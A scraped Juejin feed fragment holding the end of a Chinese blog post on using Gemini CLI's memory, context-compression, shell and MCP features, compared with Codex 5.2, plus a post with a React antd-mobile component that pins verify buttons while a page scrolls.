<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/18489dab9cc64751a5a2150c0dcd6b29~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2Via3Vib3I=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768468656&amp;x-signature=%2FQiybwD1wkI8fckvh4tkfsHUanA%3D" alt="截屏2026-01-08 17.03.29.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-2"><strong>三、短期记忆不是聊天记录，而是“工作便签”</strong></h2>
<p>即便有了持久化规则，开发中仍然存在大量<strong>临时但关键的信息</strong>：</p>
<ul>
<li>
<p>当前环境的数据库端口</p>
</li>
<li>
<p>鉴权方式与 Header 约定</p>
</li>
<li>
<p>mock 与真实接口的切换规则</p>
</li>
</ul>
<p>过去我会在对话里反复强调，现在我只做一件事：</p>
<pre><code class="hljs language-bash" lang="bash">/memory add <span class="hljs-string">"数据库端口是 5432"</span>
/memory add <span class="hljs-string">"接口使用 Bearer Token 鉴权"</span>
</code></pre>
<p>这些信息会被显式存入当前会话记忆。</p>
<p>当我用 /memory show 查看时，感觉更像在看一个<strong>项目状态板</strong>，而不是聊天历史。</p>
<hr/>
<h2 data-id="heading-3"><strong>四、对话变长不可怕，前提是你会“压缩上下文”</strong></h2>
<p>很多人用 AI 到后期都会遇到一个问题：</p>
<p>它开始忘记已经确认过的结论。</p>
<p>我以前的解决方案是：</p>
<p>新开会话，从头再来。</p>
<p>2025 年我换了一种方式：</p>
<p><strong>让 AI 自己总结当前上下文。</strong></p>
<p>当对话变长、开始发散时，我会使用：</p>
<pre><code class="hljs language-bash" lang="bash">/compress
</code></pre>
<p>它会把历史对话压缩为一个结构化摘要，</p>
<p>保留决策和约束，丢掉噪音。</p>
<p>这不是为了省 Token，</p>
<p>而是<strong>重新让上下文变得清晰、可继续推进</strong>。</p>
<hr/>
<h2 data-id="heading-4"><strong>五、从“会写代码”到“能干活”：让 AI 接入真实工作流</strong></h2>
<p>真正让我把 Gemini CLI 当成协作者的，是三件事。</p>
<h3 data-id="heading-5"><strong>1️⃣ 引用真实文件，而不是复制片段</strong></h3>
<pre><code class="hljs language-bash" lang="bash">@./src/
@./src/main.ts
</code></pre>
<p>AI 读的是完整项目结构，而不是我抽象出来的一小段示例。</p>
<h3 data-id="heading-6"><strong>2️⃣ 允许它跑命令，用结果闭环</strong></h3>
<pre><code class="hljs language-diff" lang="diff"><span class="hljs-addition">!git status</span>
<span class="hljs-addition">!pnpm test</span>
<span class="hljs-addition">!pnpm lint</span>
</code></pre>
<p>从这一刻开始，AI 的目标不再是“看起来正确”，</p>
<p>而是<strong>是否能通过真实验证</strong>。</p>
<h3 data-id="heading-7"><strong>3️⃣ MCP：让它进入调试现场</strong></h3>
<p>接入 chrome-devtools-mcp 后，</p>
<p>它可以直接看到 Performance、Network、Console 数据。</p>
<p>不是我转述问题，</p>
<p>而是它基于<strong>一手调试信息</strong>给出判断。</p>
<p>【插图提示】</p>
<p>👉 Gemini CLI 引用文件 + 执行 Shell 命令截图</p>
<p>👉 Chrome DevTools MCP 工作示意图</p>
<hr/>
<h2 data-id="heading-8"><strong>六、同为第一梯队，我为什么更看重“上下文能力”</strong></h2>
<p>2025 年我并不只用 Gemini。</p>
<p><strong>Codex 5.2</strong> 同样是第一梯队模型，在代码质量和逻辑严谨性上非常强。</p>
<p>但在真实项目中，我很快感受到一个关键差异：</p>
<blockquote>
<p><strong>即使开通 5.2，Codex 几乎不具备项目级上下文记忆能力。</strong></p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7f30fa902f84601a95cd750a4d18d4f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2Via3Vib3I=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768468656&amp;x-signature=pTl%2FZdi0fwP3Sp1n%2B6sVO%2FRdsDc%3D" alt="截屏2026-01-08 17.00.51.png" loading="lazy"/></p>
<p>它更像一个<strong>高质量的即时执行器</strong>：</p>
<ul>
<li>
<p>会话之间难以继承项目认知</p>
</li>
<li>
<p>规则、约定需要反复说明</p>
</li>
<li>
<p>对长周期协作并不友好</p>
</li>
</ul>
<p>这不是能力问题，而是设计取向不同。</p>
<p>也正因为同时使用过这两类工具，我才更加确信：</p>
<blockquote>
<p><strong>模型强不强决定下限，</strong></p>
</blockquote>
<blockquote>
<p><strong>是否具备上下文与记忆机制，才决定它能否进入日常工程流。</strong>****</p>
</blockquote>
<hr/>
<h2 data-id="heading-9"><strong>七、2025 我学到的结论：AI 提效的核心是“上下文治理”</strong></h2>
<p>这一年真正发生变化的，不只是工具，而是我自己。</p>
<p>我开始更多地做这些事：</p>
<ul>
<li>
<p>明确规则与边界</p>
</li>
<li>
<p>设计验收标准</p>
</li>
<li>
<p>把“正确性”工程化</p>
</li>
</ul>
<p>AI 依然写得很快，但<strong>不再失控</strong>。</p>
<p><strong>Vibe Coding 不是放飞，而是建立信任的前提。</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/426487422a3d4530874891e416853ff2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2Via3Vib3I=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768468656&amp;x-signature=ekGXudpt74VSqRKSKPbZ1s31zhA%3D" alt="截屏2026-01-08 15.59.02.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-10"><strong>写在最后：2026，我会继续把 AI 当成工程系统的一部分</strong></h2>
<p>2026 年，我不会再追逐“更强的提示词”。</p>
<p>我会继续：</p>
<ul>
<li>
<p>分层维护项目上下文</p>
</li>
<li>
<p>固化高频任务为命令</p>
</li>
<li>
<p>用 MCP 连接更多真实数据源</p>
</li>
</ul>
<p>因为我已经确认了一件事：</p>
<blockquote>
<p><strong>当上下文清晰、记忆可靠，</strong></p>
</blockquote>
<blockquote>
<p><strong>AI 才真正具备进入生产环境的资格。</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-11"><strong>同为第一梯队，我为什么对“上下文能力”格外敏感</strong></h2>
<blockquote>
<p>这一点，其实和我同时使用 <strong>Codex 5.2</strong> 有很大关系。</p>
</blockquote>
<p>2025 年，我并不是只用 Gemini。</p>
<p>作为第一梯队模型，<strong>Codex 5.2</strong> 在代码生成质量、逻辑严谨性上同样非常强，甚至在某些复杂算法和抽象建模上，表现得更“像工程师”。</p>
<p>但在真实项目协作中，我很快感受到了一个决定性的差异：</p>
<blockquote>
<p><strong>Codex 5.2（即使已开通）几乎不具备“项目级上下文记忆”。</strong></p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/81a69567e6264016a1bcc5683d8d26e1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2Via3Vib3I=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768468656&amp;x-signature=GnUXi9VwFyEUNNp16ZgMqOg%2BC1E%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-12"><strong>附：我在项目中使用的关键命令（节选）</strong></h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 持久化上下文</span>
GEMINI.md

<span class="hljs-comment"># 短期记忆</span>
/memory add
/memory show
/memory refresh

<span class="hljs-comment"># 压缩对话</span>
/compress

<span class="hljs-comment"># 引用真实文件</span>
@./src/

<span class="hljs-comment"># Shell 直通</span>
!git status
!pnpm <span class="hljs-built_in">test</span>

<span class="hljs-comment"># 安装 chrome-devtools-mcp</span>
gemini mcp add -s user chrome-devtools npx chrome-devtools-mcp@latest
</code></pre>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[在手机端做个滚动效果]]></title>    <link>https://juejin.cn/post/7592805973120761862</link>    <guid>https://juejin.cn/post/7592805973120761862</guid>    <pubDate>2026-01-08T10:00:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592805973120761862" data-draft-id="7592805973120712710" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="在手机端做个滚动效果"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-08T10:00:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="snow来了"/> <meta itemprop="url" content="https://juejin.cn/user/1714893871392792"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            在手机端做个滚动效果
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1714893871392792/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    snow来了
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T10:00:20.000Z" title="Thu Jan 08 2026 10:00:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>用react开发一个antd mobile组件,页面上有多个高度不等的div元素,每个div底部都有一个「核对」按钮。当div的高度大于屏幕高度的时候，就要将这个div底部的「核对」按钮锁定在页面底部，方便用户操作。当用户滚动页面，这个div的底部进入屏幕的时候，就要取消「核对」按钮的锁定，要它回归原处，跟随这个div进行滚动。当第二个div进入屏幕50%的时候，在此将它的「核对」按钮锁定在页面上。你帮我用监听滚动的方式实现这个功能，所有的代码都写在一个文件里面，组件的名字叫：MaterialVerificationSon</p>
<p>如果出现按钮取消锁定有抖动，是样式问题，用    transform: isFixed ? 'translateX(-2px)' : 'none',可以解决</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Button</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'antd-mobile'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, { useEffect, useRef, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-comment">// import { useLocation } from '@tanstack/react-location';</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">MaterialVerificationSon</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span> = <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// 示例数据：包含不同高度的div内容</span>
  <span class="hljs-keyword">const</span> [items] = <span class="hljs-title function_">useState</span>([
    { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">'这是第一个材料项，高度适中'</span>, <span class="hljs-attr">height</span>: <span class="hljs-number">780</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">'这是第二个材料项，高度较高，内容较多，需要滚动查看'</span>, <span class="hljs-attr">height</span>: <span class="hljs-number">800</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">3</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">'这是第三个材料项，高度非常高，内容非常多，需要大量滚动'</span>, <span class="hljs-attr">height</span>: <span class="hljs-number">1200</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">4</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">'这是第四个材料项，高度适中'</span>, <span class="hljs-attr">height</span>: <span class="hljs-number">400</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">5</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">'这是第五个材料项，高度较高'</span>, <span class="hljs-attr">height</span>: <span class="hljs-number">900</span> },
  ]);
  <span class="hljs-keyword">const</span> contentRef = useRef&lt;<span class="hljs-title class_">HTMLDivElement</span>&gt;(<span class="hljs-literal">null</span>);

  <span class="hljs-comment">// 存储每个元素的ref</span>
  <span class="hljs-keyword">const</span> itemRefs = useRef&lt;<span class="hljs-title class_">Array</span>&lt;<span class="hljs-title class_">HTMLDivElement</span> | <span class="hljs-literal">null</span>&gt;&gt;([]);
  <span class="hljs-comment">// 存储每个按钮的锁定状态</span>
  <span class="hljs-keyword">const</span> [lockedButtons, setLockedButtons] = useState&lt;<span class="hljs-title class_">Record</span>&lt;number, boolean&gt;&gt;({});

  <span class="hljs-comment">// 获取屏幕高度</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">getScreenHeight</span> = (<span class="hljs-params"/>) =&gt; <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>;

  <span class="hljs-comment">// 检查元素是否在视口中</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">isElementInViewport</span> = (<span class="hljs-params">element: HTMLElement</span>) =&gt; {
    <span class="hljs-keyword">const</span> rect = element.<span class="hljs-title function_">getBoundingClientRect</span>();
    <span class="hljs-keyword">return</span> rect.<span class="hljs-property">top</span> &lt; <span class="hljs-title function_">getScreenHeight</span>() &amp;&amp; rect.<span class="hljs-property">bottom</span> &gt; <span class="hljs-number">0</span>;
  };

  <span class="hljs-comment">// 检查元素底部是否在视口内</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">isElementBottomInViewport</span> = (<span class="hljs-params">element: HTMLElement</span>) =&gt; {
    <span class="hljs-keyword">const</span> rect = element.<span class="hljs-title function_">getBoundingClientRect</span>();
    <span class="hljs-keyword">const</span> elementBottom = rect.<span class="hljs-property">bottom</span>;
    <span class="hljs-keyword">return</span> elementBottom &lt;= <span class="hljs-title function_">getScreenHeight</span>() &amp;&amp; elementBottom &gt; <span class="hljs-number">0</span>;
  };

  <span class="hljs-comment">// 检查元素是否至少有50%在视口内</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">isElementHalfVisible</span> = (<span class="hljs-params">element: HTMLElement</span>) =&gt; {
    <span class="hljs-keyword">const</span> rect = element.<span class="hljs-title function_">getBoundingClientRect</span>();
    <span class="hljs-keyword">const</span> elementHeight = rect.<span class="hljs-property">height</span>;
    <span class="hljs-keyword">const</span> visibleHeight = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-title function_">getScreenHeight</span>() - rect.<span class="hljs-property">top</span>, <span class="hljs-number">0</span>), elementHeight);
    <span class="hljs-keyword">return</span> visibleHeight / elementHeight &gt;= <span class="hljs-number">0.5</span>;
  };

  <span class="hljs-comment">// 检查元素是否过高（超过屏幕高度）</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">isElementTooTall</span> = (<span class="hljs-params">element: HTMLElement</span>) =&gt; {
    <span class="hljs-keyword">return</span> element.<span class="hljs-property">scrollHeight</span> &gt; <span class="hljs-title function_">getScreenHeight</span>();
  };

  <span class="hljs-comment">// 处理滚动事件</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleScroll</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">const</span> <span class="hljs-attr">newLockedButtons</span>: <span class="hljs-title class_">Record</span>&lt;number, boolean&gt; = {};

    items.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">item, index</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> element = itemRefs.<span class="hljs-property">current</span>[index];
      <span class="hljs-keyword">if</span> (!element) <span class="hljs-keyword">return</span>;

      <span class="hljs-keyword">const</span> elementTooTall = <span class="hljs-title function_">isElementTooTall</span>(element); <span class="hljs-comment">//是否大于屏幕高度</span>
      <span class="hljs-keyword">const</span> elementInViewport = <span class="hljs-title function_">isElementInViewport</span>(element); <span class="hljs-comment">//是不是在视口里面</span>
      <span class="hljs-keyword">const</span> elementBottomInViewport = <span class="hljs-title function_">isElementBottomInViewport</span>(element); <span class="hljs-comment">//检查元素底部是否在视口内</span>
      <span class="hljs-keyword">const</span> elementHalfVisible = <span class="hljs-title function_">isElementHalfVisible</span>(element); <span class="hljs-comment">//视口50%</span>

      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(elementInViewport, index);
      <span class="hljs-keyword">if</span> (elementInViewport &amp;&amp; elementTooTall &amp;&amp; elementHalfVisible) {
        newLockedButtons[item.<span class="hljs-property">id</span>] = <span class="hljs-literal">true</span>;
      }

      <span class="hljs-keyword">if</span> (elementBottomInViewport) {
        newLockedButtons[item.<span class="hljs-property">id</span>] = <span class="hljs-literal">false</span>;
      }
    });

    <span class="hljs-title function_">setLockedButtons</span>(newLockedButtons);
  };
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(lockedButtons, <span class="hljs-number">9999</span>);
  <span class="hljs-comment">// 添加滚动事件监听器</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (contentRef.<span class="hljs-property">current</span>) {
      contentRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'scroll'</span>, handleScroll);
      <span class="hljs-comment">// 初始执行一次</span>
      <span class="hljs-title function_">handleScroll</span>();
    }

    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-keyword">if</span> (contentRef.<span class="hljs-property">current</span>) {
        contentRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'scroll'</span>, handleScroll);
      }
    };
  }, []);

  <span class="hljs-comment">// 核对按钮点击处理</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleVerify</span> = (<span class="hljs-params">id: number</span>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`核对按钮被点击，ID: <span class="hljs-subst">${id}</span>`</span>);
    <span class="hljs-comment">// 这里可以添加具体的核对逻辑</span>
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">padding:</span> '<span class="hljs-attr">16px</span>', <span class="hljs-attr">height:</span> '<span class="hljs-attr">100vh</span>', <span class="hljs-attr">overflowY:</span> '<span class="hljs-attr">auto</span>' }} <span class="hljs-attr">ref</span>=<span class="hljs-string">{contentRef}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>材料核对页面<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>

      {items.map((item, index) =&gt; (
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>
          <span class="hljs-attr">key</span>=<span class="hljs-string">{item.id}</span>
          <span class="hljs-attr">ref</span>=<span class="hljs-string">{el</span> =&gt;</span> (itemRefs.current[index] = el)}
          style={{
            border: '1px solid #ddd',
            borderRadius: '8px',
            padding: '16px',
            marginBottom: '16px',
            overflowY: 'auto',
          }}
        &gt;
          <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>材料项 {item.id}<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{item.content}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>高度: {item.height}px<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">height:</span> `${<span class="hljs-attr">item.height</span>}<span class="hljs-attr">px</span>` }}&gt;</span>
            这是一个示例内容，实际应用中这里会有具体的材料信息。
          <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

          {/* 核对按钮 */}
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>
            <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span>
              <span class="hljs-attr">position:</span> <span class="hljs-attr">lockedButtons</span>[<span class="hljs-attr">item.id</span>] ? '<span class="hljs-attr">fixed</span>' <span class="hljs-attr">:</span> '<span class="hljs-attr">static</span>',
              <span class="hljs-attr">bottom:</span> <span class="hljs-attr">lockedButtons</span>[<span class="hljs-attr">item.id</span>] ? '<span class="hljs-attr">20px</span>' <span class="hljs-attr">:</span> '<span class="hljs-attr">auto</span>',
              <span class="hljs-attr">left:</span> <span class="hljs-attr">lockedButtons</span>[<span class="hljs-attr">item.id</span>] ? '<span class="hljs-attr">50</span>%' <span class="hljs-attr">:</span> '<span class="hljs-attr">auto</span>',
              <span class="hljs-attr">transform:</span> <span class="hljs-attr">lockedButtons</span>[<span class="hljs-attr">item.id</span>] ? '<span class="hljs-attr">translateX</span>(<span class="hljs-attr">-50</span>%)' <span class="hljs-attr">:</span> '<span class="hljs-attr">none</span>',
              <span class="hljs-attr">zIndex:</span> <span class="hljs-attr">1000</span>,
              <span class="hljs-attr">width:</span> '<span class="hljs-attr">100</span>%',
              <span class="hljs-attr">display:</span> '<span class="hljs-attr">flex</span>',
              <span class="hljs-attr">justifyContent:</span> '<span class="hljs-attr">center</span>',
              <span class="hljs-attr">marginTop:</span> '<span class="hljs-attr">16px</span>',
            }}
          &gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">Button</span>
              <span class="hljs-attr">color</span>=<span class="hljs-string">"primary"</span>
              <span class="hljs-attr">size</span>=<span class="hljs-string">"large"</span>
              <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> handleVerify(item.id)}
              style={{
                width: '80%',
                maxWidth: '300px',
              }}
            &gt;
              核对1111{index}
            <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      ))}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};

</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JS中对象是怎么运算的呢]]></title>    <link>https://juejin.cn/post/7592789801708339241</link>    <guid>https://juejin.cn/post/7592789801708339241</guid>    <pubDate>2026-01-08T07:56:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592789801708339241" data-draft-id="7592572266754195519" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JS中对象是怎么运算的呢"/> <meta itemprop="keywords" content="前端,JavaScript,面试"/> <meta itemprop="datePublished" content="2026-01-08T07:56:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="我的写法有点潮"/> <meta itemprop="url" content="https://juejin.cn/user/1643143620204234"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JS中对象是怎么运算的呢
